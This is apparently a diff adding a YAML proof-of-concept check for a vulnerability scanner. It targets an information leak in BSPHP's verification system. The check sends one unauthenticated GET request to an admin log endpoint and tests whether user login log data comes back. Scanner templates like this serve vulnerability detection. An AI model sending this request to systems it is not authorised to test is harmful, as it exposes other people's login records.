@@ -1,0 +1,16 @@
+id: poc-yaml-bsphp-verify-system-info-leak
+info:
+  name: BSPHP Verify System Info Leak漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: BSPHP
+  osprey-id: vb_2022_0124
+requests:
+- method: GET
+  path: /admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0
+  expression: 'contains(body, "{\"data\":[{\"key\":\"") && contains(body, "\"code\":0")
+
+    '
+variables: {}
+transport: http
